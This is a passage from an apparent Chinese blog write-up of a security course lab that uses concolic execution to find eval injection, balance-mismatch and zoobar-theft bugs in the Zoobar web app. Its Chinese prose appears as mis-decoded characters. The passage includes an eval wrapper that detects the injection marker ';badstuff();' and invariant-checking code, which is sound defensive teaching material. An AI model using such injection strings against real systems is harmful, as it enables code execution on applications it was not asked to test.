primary_key_in_row == primary_key:<br>      <span class="hljs-keyword">return</span> r<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 8ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/wIzaOhY4bJxsNgq.png" alt="image.png"></p><blockquote><p>æ³¨æ„è¿™é‡Œéœ€è¦<strong>é¢å¤–é€šè¿‡ Exercise 9 çš„ç¬¬ä¸€é¡¹æ‰è¡¨ç¤ºåšå¯¹äº†</strong>ï¼Œå› ä¸ºåé¢éœ€è¦å€ŸåŠ©è¿™é‡Œçš„ç¬¦å·æ‰§è¡Œä»£ç æ¼”ç¤ºä¸€äº›ä¸œè¥¿</p></blockquote><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹å¯¹ Zoobar åº”ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæ¡†æ¶äº†ï¼Œæˆ‘ä»¬é¦–å…ˆå°è¯•è¿è¡Œ <code>./check-symex-zoobar.py</code>ï¼Œåœ¨å…¶ä¸­æœ‰ç€å¯¹ Zoobar ä½¿ç”¨ç¬¦å·è¾“å…¥çš„ç›¸å…³é€»è¾‘ï¼Œä¸”ä¸ºäº†è®©æ··åˆæ‰§è¡Œèƒ½å¤Ÿå¿«é€Ÿç»“æŸï¼Œå…¶è¿‡åº¦çº¦æŸäº†ç»™äºˆ Zoobar çš„è¾“å…¥ï¼Œæ­¤å¤–æ‰€æœ‰çš„ HTTP è¯·æ±‚æ–¹æ³•ï¼ˆäº <code>environ[&#39;REQUEST_METHOD&#39;]</code> ä¸­ï¼‰çš†ä¸º <code>GET</code>ï¼Œä¸”è¯·æ±‚çš„æ‰€æœ‰ UQLï¼ˆäº <code>environ[&#39;PATH_INFO&#39;]</code> ä¸­ï¼‰çš†ä»¥ <code>trans</code> èµ·å§‹</p><p>ç›¸è¾ƒäºç›´æ¥è¿è¡Œï¼ŒLab æ›´æ¨èä½¿ç”¨ <code>script</code> æ¥è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>ä¹‹åå±å¹•ä¸Šä¼šæŒç»­æ‰“å‡ºä¸€å †ä¿¡æ¯ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/D79tqYuBGXFHPjd.png" alt="image.png"></p><p>å¤§æ¦‚åå‡ ç§’åç»“æŸï¼Œè¿­ä»£çš„æ•°é‡è¡¨ç¤ºä¸åŒçš„è·¯å¾„ï¼š</p><p><img src="https://s2.loli.net/2022/12/21/UHD4s6MIq9pRCBc.png" alt="image.png"></p><blockquote><p>å’Œå®éªŒæ‰‹å†Œä¸­ä¸åŒçš„æ˜¯ç¬”è€…è¿™é‡Œæœ‰ <code>142 iterations</code>ï¼Œä½†åœ¨å®éªŒæ‰‹å†Œé‡Œæ˜¯ <code>139</code>ï¼Œè¿™é‡Œæš‚ä¸”å…ˆä¸ç®¡ï¼ˆ</p></blockquote><p>ç”±äº Zoobar ç”± Python ç¼–å†™ï¼Œæ•…ä¸ä¼šæœ‰å†…å­˜æŸåè¿™ä¸€ç±»çš„æ¼æ´ï¼ˆè¿™å¥è¯æ˜¯å®éªŒæ‰‹å†Œè¯´çš„ï¼Œä½†æ˜¯<a href="https://www.cvedetails.com/cve/CVE-2021-3177/"> CVE-2021-3177</a>å’Œä¸€ä¼—å…¶ä»– CVE è¡¨ç¤ºï¼šæ€ä¹ˆä¼šæ˜¯å‘¢ï¼Ÿï¼‰ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æ³•ç«‹åˆ»è¾¨æ˜åœ¨è¿™ä¸€ç™¾å¤šè·¯å¾„ä¸­æ˜¯å¦å­˜åœ¨é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›æ˜¾å¼çš„ä¸å˜é‡ï¼ˆinvariantï¼‰æ¥æ•æ‰è¡¨ç¤ºå®‰å…¨é—®é¢˜çš„æƒ…å†µ</p><p>Lab å·²ç»å®ç°äº†çš„ä¸€ä¸ªä¸å˜é‡ä¾¿æ˜¯ eval injectionâ€”â€”å³å¯¹ <code>eval()</code> çš„å‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ <code>symex/symeval.py</code> ä¸­ Lab ç»™å‡ºäº†å¯¹è¿™ç§æƒ…å†µçš„æ£€æŸ¥æ€è·¯ï¼šè‹¥ä¼ ç»™ <code>eval()</code> çš„å­—ç¬¦ä¸²å¯ä»¥åŒ…å«  <code>;badstuff();</code> ï¼Œè¯´æ˜æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª eval injection æ¼æ´â€”â€”ç”±æ­¤æˆ‘ä»¬å¯ä»¥è®©æ··åˆæ‰§è¡Œç³»ç»Ÿå»å°è¯•æ„å»ºèƒ½åŒ…å«è¯¥å­ä¸²çš„å­—ç¬¦ä¸²</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ Zoobar ä¸­æ˜¯å¦å­˜åœ¨ eval injection æ¼æ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py | grep <span class="hljs-string">&quot;Exception: eval injection&quot;</span></span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼Œå‘ç°äº†ä¸¤ä¸ª eval injectionï¼š</p><p><img src="https://s2.loli.net/2022/12/21/YslcqeuVP2C6Ni7.png" alt="image.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹  <code>symex/symeval.py</code>  çš„å†…éƒ¨é€»è¾‘ï¼Œå…¶é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»™å†…ç½®çš„ <code>eval()</code> å¥—äº†ä¸€å±‚ wrapperï¼Œæ£€æŸ¥å‚æ•°æ˜¯å¦å¸¦æœ‰  <code>;badstuff();</code> å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æŠ›å¼‚å¸¸ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">real_eval = builtins.<span class="hljs-built_in">eval</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myeval</span>(<span class="hljs-params">expr, <span class="hljs-built_in">globals</span> = <span class="hljs-literal">None</span>, <span class="hljs-built_in">locals</span> = <span class="hljs-literal">None</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;badstuff();&#x27;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;eval injection&quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">locals</span> = <span class="hljs-built_in">globals</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    frame = inspect.currentframe()<br>    <span class="hljs-keyword">try</span>:<br>      <span class="hljs-built_in">locals</span> = frame.f_back.f_locals<br>      <span class="hljs-built_in">globals</span> = frame.f_back.f_globals<br>    <span class="hljs-keyword">finally</span>:<br>      <span class="hljs-keyword">del</span> frame<br><br>  <span class="hljs-comment">## Try to evaluate the expression as an integer</span><br>  v = str_to_small_int(expr)<br>  <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> v<br><br>  <span class="hljs-keyword">return</span> real_eval(expr, <span class="hljs-built_in">globals</span>, <span class="hljs-built_in">locals</span>)<br>builtins.<span class="hljs-built_in">eval</span> = myeval<br></code></pre></td></tr></table></figure><p>è€Œåœ¨ <code>check-symex-zoobar.py</code> å½“ä¸­ï¼Œåº”ç”¨äº†æ··åˆæ‰§è¡Œæ¡†æ¶çš„ä¸º <code>test_stuff()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzzy.concolic_execs(test_stuff, maxiter=<span class="hljs-number">500</span>, verbose=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æš‚ä¸”å…ˆä¸å…³æ³¨ Zoobar çš„å®ç°ä¸ºä½•ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä½•ä½¿ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œç³»ç»Ÿæ¥å¯»æ‰¾å…¶ä¸­çš„æ¼æ´ï¼Œåœ¨ <code>test_stuff()</code> ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡å°†éƒ¨åˆ†å‚æ•°è®¾ç½®ä¸ºæ··åˆå€¼æ¥è¿›è¡Œæ··åˆæ‰§è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  <span class="hljs-comment"># Zoobaråˆå§‹åŒ–å·¥ä½œ</span><br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  <span class="hljs-comment">##...</span><br><br>  <span class="hljs-comment">## è®¾ç½®ç¯å¢ƒå˜é‡</span><br>  environ = &#123;&#125;<br>  <span class="hljs-comment">##...</span><br>  environ[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;referrer&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  environ[<span class="hljs-string">&#x27;HTTP_COOKIE&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å®ç°ä¸¤ç§é¢å¤–çš„ä¸å˜é‡æ£€æŸ¥ä»¥æ£€æŸ¥ Zoobar æ˜¯å¦å­˜åœ¨å…¶ä»–æ¼æ´ï¼š</p><ul><li>è‹¥æ²¡æœ‰æ–°ç”¨æˆ·è¢«æ³¨å†Œï¼Œåˆ™æ‰€æœ‰ç”¨æˆ·çš„ Zoobar balances ä¹‹å’Œåº”å½“åœ¨æ¯æ¬¡è¯·æ±‚é—´ä¿æŒä¸€è‡´</li><li>è‹¥ç”¨æˆ· <code>u</code> æ²¡æœ‰å‘ Zoobar è¿›è¡Œè¯·æ±‚ï¼Œ<code>u</code> çš„ Zoobar balance ä¸åº”å½“ç¼©å°</li></ul><p>äºæ˜¯æ¥åˆ° Exercise 9ï¼Œå‘  <code>check-symex-zoobar.py</code> ä¸­æ·»åŠ ç›¸åº”çš„ä¸å˜é‡æ£€æŸ¥ï¼š</p><blockquote><p><strong>Exercise 9.</strong> Add invariant checks to <code>check-symex-zoobar.py</code> to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment <code>Exercise 9: your code here</code> to see where you should write this code. When you detect a zoobar balance mismatch, call the <code>report_balance_mismatch()</code> function. When you detect zoobar theft, call <code>report_zoobar_theft()</code>.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to re-run <strong>.&#x2F;check-symex-zoobar.py</strong> and see whether the output contains the messages <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you (run <code>check-symex-zoobar.py</code> and look for these magic strings).</p></blockquote><p>åœ¨ Zoobar ä¸­å®é™…ä¸Šæ˜¯é€šè¿‡ <code>zoobar.app()</code> æ¥å®Œæˆ HTTP è¯·æ±‚çš„è§£æå®ç°ï¼Œå› æ­¤åœ¨  <code>test_stuff()</code>  ä¸­é€‰æ‹©ç›´æ¥æ„é€ è¯·æ±‚ï¼ˆ<code>environ</code> å­—å…¸ï¼‰ä¼ é€’ç»™è¯¥å‡½æ•°æ¥æ¨¡æ‹Ÿå‘ Zoobar å‘é€ HTTP è¯·æ±‚çš„è¿‡ç¨‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = &#123;&#125;<br><span class="hljs-comment">##...</span><br>environ[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>] = <span class="hljs-string">&#x27;trans&#x27;</span> + fuzzy.mk_str(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">if</span> environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].startswith(<span class="hljs-string">&#x27;//&#x27;</span>):<br>  <span class="hljs-comment">## Don&#x27;t bother trying to construct paths with lots of slashes;</span><br>  <span class="hljs-comment">## otherwise, the lstrip() code generates lots of paths..</span><br>  <span class="hljs-keyword">return</span><br><br>resp = zoobar.app(environ, startresp)<br><span class="hljs-keyword">if</span> verbose:<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> resp:<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯¹ä»£ç çš„æ£€æŸ¥åˆ™æ˜¯åœ¨è¯·æ±‚å®Œæˆåè¿›è¡Œçš„ï¼Œé¦–å…ˆæ˜¯å¯¹ balance çš„æ£€æŸ¥ï¼Œè¿™é‡Œä¸äº†è§£ Zoobar çš„ç›¸å…³ç»“æ„ï¼ˆæˆ–è€…æ²¡æ¥å¾—åŠ<del>&#x2F;æ‡’å¾—</del>çœ‹ï¼‰ä¹Ÿä¸è¦ç´§ï¼Œåœ¨ <code>test_stuff()</code> çš„å¼€å¤´æœ‰è¿™æ ·çš„è®¡ç®— balances æ€»å’Œçš„é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  <span class="hljs-comment"># è®¡ç®— balance æ€»å’Œ</span><br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br></code></pre></td></tr></table></figure><p>å¯¹äºå•ä¸ªç”¨æˆ·è€Œè¨€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>person.zoobars</code> è·å–å…¶ balanceï¼Œè€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>pdb.query(zoobar.zoodb.Person).all()</code> è·å–ç”¨æˆ·å¯¹è±¡åˆ—è¡¨ ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨è¯·æ±‚ç»“æŸåä½¿ç”¨åŒæ ·çš„é€»è¾‘è®¡ç®—å½“å‰çš„ balanceï¼Œå¹¶ä¸åŸ balance å¯¹æ¯”å³å¯ï¼Œè‹¥ä¸ä¸€è‡´åˆ™æŒ‰æ‰‹å†Œè¯´æ˜è°ƒç”¨ <code>report_balance_mismatch()</code> å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 9: your code here.</span><br><br><span class="hljs-comment">## Detect balance mismatch.</span><br><span class="hljs-comment">## When detected, call report_balance_mismatch()</span><br>balance2 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br><span class="hljs-keyword">if</span> balance1 != balance2:<br>  report_balance_mismatch()<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ç¬¬äºŒä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ²¡æœ‰è¿›è¡Œæ“ä½œä½†æ˜¯ balance ç¼©å°äº†çš„ç”¨æˆ·ï¼ˆå³å‘ç”Ÿè½¬å‡ºï¼‰ï¼Œç”±äºåœ¨æµ‹è¯•å‡½æ•°ä¸­ä»…è¿›è¡Œäº†ä¸€æ¬¡æ“ä½œï¼Œæ•…æœªè¿›è¡Œæ“ä½œçš„ç”¨æˆ·çš„ balance <strong>ä¸åº”å½“å°äºåˆå§‹å€¼</strong>ï¼ˆä½†æ˜¯å¯ä»¥å¤§äºï¼Œå› ä¸ºå¯ä»¥æœ‰åˆ«çš„è´¦æˆ·å‘å…¶è¿›è¡Œè½¬å…¥ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªç”¨æˆ·çš„åˆå§‹ä¿¡æ¯</p><p>åœ¨ <code>test_stuff()</code> å¼€å¤´ä¾¿å¯¹åº”åˆ›å»ºäº†ä¸¤ä¸ªæ•°æ®åº“ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»å…¶å®šä¹‰å…¥æ‰‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br>  pdb.commit()<br><br>  tdb = zoobar.zoodb.transfer_setup()<br>  tdb.query(zoobar.zoodb.Transfer).delete()<br>  tdb.commit()<br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>zoobar/zoodb.py</code> ä¸­å®šä¹‰äº† Person æ•°æ®åº“ï¼Œå…¶ä¸­ balanceï¼ˆä¹Ÿå°±æ˜¯ zoobars å­—æ®µï¼‰çš„åˆå§‹å€¼ä¸º 10ï¼ŒåŒæ—¶ä¸»é”®ä¸º <code>username</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(<span class="hljs-title class_ inherited__">PersonBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;person&quot;</span><br>    username = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    password = Column(String(<span class="hljs-number">128</span>))<br>    token = Column(String(<span class="hljs-number">128</span>))<br>    zoobars = Column(Integer, nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-number">10</span>)<br>    profile = Column(String(<span class="hljs-number">5000</span>), nullable=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥æ–‡ä»¶ä¸­è¿˜å®šä¹‰äº† Transfer æ•°æ®åº“ï¼Œåº”å½“ç”¨ä»¥è¡¨ç¤ºå•æ¬¡äº¤æ˜“çš„åŒæ–¹åŠæ•°å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Transfer</span>(<span class="hljs-title class_ inherited__">TransferBase</span>):<br>    __tablename__ = <span class="hljs-string">&quot;transfer&quot;</span><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>)<br>    sender = Column(String(<span class="hljs-number">128</span>))<br>    recipient = Column(String(<span class="hljs-number">128</span>))<br>    amount = Column(Integer)<br>    time = Column(String)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥éå† Person æ•°æ®åº“ä»¥è·å¾—æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åé›†åˆï¼Œæ¥ä¸‹æ¥éå† Transfer æ•°æ®åº“æ¥å°†ç”¨æˆ·åé›†åˆä¸­çš„é sender ç»™å‰”é™¤ï¼ˆå› ä¸ºæˆ‘ä»¬ä¸»è¦å…³æ³¨ recipient å‘ç”Ÿäº† balance ç¼©å°çš„æƒ…å†µï¼‰ï¼Œæœ€åæ£€æŸ¥å‰©ä½™ç”¨æˆ·æ˜¯å¦å­˜åœ¨ balance å°äºåˆå§‹å€¼çš„æƒ…å†µï¼Œè‹¥æ˜¯åˆ™è¯´æ˜å­˜åœ¨æ¼æ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Detect zoobar theft.</span><br><span class="hljs-comment">## When detected, call report_zoobar_theft()</span><br>udict = &#123;&#125;<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>():<br>  udict[p.username] = p<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tdb.query(zoobar.zoodb.Transfer).<span class="hljs-built_in">all</span>():<br>  udict.pop(t.sender)<br><span class="hljs-keyword">for</span> username <span class="hljs-keyword">in</span> udict.keys():<br>  <span class="hljs-keyword">if</span> udict[username].zoobars &lt; <span class="hljs-number">10</span>:<br>    report_zoobar_theft()<br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡ Exercise 9ï¼š</p><p><img src="https://s2.loli.net/2022/12/24/FnSvPHRsQbc6LZT.png" alt="image.png"></p><p>æœ€åæ˜¯ Exercise 10ï¼Œä¿®å¤ balance mismatch å’Œ zoobar theft è¿™ä¸¤ä¸ªæ¼æ´ï¼ˆLab å·²ç»æ›¿æˆ‘ä»¬ä¿®å¥½äº† eval injection çš„æ¼æ´ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œè¯„æµ‹ç³»ç»Ÿè¦æ±‚å°†å­˜åœ¨é—®é¢˜çš„æºç æ–‡ä»¶æ‹·è´åˆ° <code>zoobar-fixed</code> ä¸‹å†è¿›è¡Œä¿®å¤ï¼Œï¼š</p><blockquote><p><strong>Exercise 10.</strong> Fix the two bugs you found in Exercise 9, by copying whatever <code>.py</code> files you need to modify from the <code>zoobar</code> directory to <code>zoobar-fixed</code> and changing them there.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to run <strong>.&#x2F;check-symex-zoobar-fixed.sh</strong> and see whether the output still contains the messages <code>Exception: eval injection</code>, <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you.</p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¦æ‰¾åˆ°æ¼æ´å‡ºç°çš„ä½ç½®ï¼Œç¬”è€…æœ€åˆçš„æ€è·¯æ˜¯åœ¨ä¸¤ä¸ªæ‰¾åˆ°æ¼æ´çš„ report å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£å°±å¯ä»¥è·å¾—é€ æˆé—®é¢˜çš„è¾“å…¥ï¼Œä½†æ˜¯<strong>è¿™ä¸ªåšæ³•å¹¶ä¸å¯è¡Œï¼Œå› ä¸ºæœ¬ Lab æä¾›çš„æ··åˆæ‰§è¡Œæ¡†æ¶æ˜¯é«˜åº¦å°è£…å¥½çš„</strong>ï¼Œåœ¨ <code>concolic_execs()</code> çš„æ‰§è¡Œè¿‡ç¨‹ä¸­æˆ‘ä»¬æ˜¯æ²¡åŠæ³•ä¸­é€”åœä¸‹æ¥è¿›è¡Œçº¦æŸæ±‚è§£çš„</p><blockquote><p>ç¬”è€…æ€è€ƒäº†åŠå¤©æ€ä¹ˆæ”¹æ‰èƒ½åœ¨ <code>test_stuff()</code> çš„ä¸¤ä¸ª report() å‡½æ•°è¿›è¡Œçº¦æŸæ±‚è§£æ¥å¾—åˆ°è§¦å‘æ¼æ´çš„è¾“å…¥ï¼Œåé¢å‘ç°åŸºæœ¬æ²¡å•¥å¯è¡Œæ€§ï¼Œå®åœ¨è¦å¼„çš„è¯éœ€è¦å¯¹æ•´ä¸ªæ¡†æ¶è¿›è¡Œå¤§æ”¹ï¼Œæ•…å°±æ­¤ä½œç½¢æ”¹æ¢æ€è·¯â€¦</p></blockquote><p>æˆ‘ä»¬é‡æ–°æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š  <em>Lab 3 ä¸ºä»€ä¹ˆæä¾›çš„æ˜¯æ··åˆæ‰§è¡Œæ¡†æ¶è€Œéçº¯ç¬¦å·æ‰§è¡Œæˆ–æ˜¯çº¯å…·ä½“æ‰§è¡Œå‘¢ï¼Ÿ</em>  </p><p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œconcolic execution çš„è¯ç”Ÿä¾¿æ˜¯ä¸ºäº†è§£å†³ symbolic execution ä¸ concrete execution æ‰€åˆ†åˆ«å­˜åœ¨çš„é—®é¢˜ï¼Œèåˆä¸¤è€…çš„ç‰¹æ€§æ¥è¾¾åˆ°ä¸€ä¸ªæ›´å¥½çš„æ•ˆæœ</p><p>ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>concolic_execs()</code> çš„æ‰§è¡Œæµç¨‹ï¼š</p><ul><li>ç”±ä¸€ä¸ªå¤–å±‚å¤§å¾ªç¯ä¸æ–­è¿­ä»£<ul><li>ä»è¾“å…¥é˜Ÿåˆ—ä¸­å–å‡ºå…·ä½“å€¼å­—å…¸</li><li>è°ƒç”¨ <code>concolic_exec_input()</code> æ‰§è¡Œç›®æ 